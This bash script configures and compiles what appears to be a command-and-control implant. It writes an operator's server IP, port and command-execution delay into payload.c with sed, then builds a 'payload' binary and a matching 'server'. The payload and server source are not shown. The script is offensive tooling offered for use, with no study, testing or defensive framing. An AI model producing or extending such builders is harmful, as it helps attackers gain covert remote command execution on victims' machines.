#!/bin/bash

ip=""
port=""
sleepInt=""

while [ $# -gt 0 ]; do
 case "$1" in
   -h | --help) # help
     echo "Usage: $0 -i <IP> -p <PORT> -s <SLEEP INTERVAL>"
     echo '-i, --ip <IP>		IP address of the server'
     echo '-p, --port <PORT NUM>	Listening port of server'
     echo '-s, --sleep <SLEEP>		Delay between command execution (in seconds)'
     exit 0
   ;;
   -i | --ip) #  ip address
     ip="$2"
     shift
     sed -i "s|#define ip_addr .*|#define ip_addr \"$ip\"|" payload.c
   ;;
   -p | --port) # port
     port="$2"
     shift
     sed -i "s|^#define PORT .*|#define PORT $port|" payload.c
   ;;
   -s | --sleep) # sleep
     sleepInt="$2"
     shift
     sed -i "s|sleep([0-9]\+)|sleep($sleepInt)|" payload.c
   # Process the specified file
   ;;
   *)
   # invalid options
   echo "Unknown Option: $1"
   echo "Usage: $0 -i <IP> -p <PORT> -s <SLEEP INTERVAL>"
   exit 1
   ;;
 esac
 shift
done

gcc -Iinclude -o payload payload.c execute.c && gcc -o server server.c
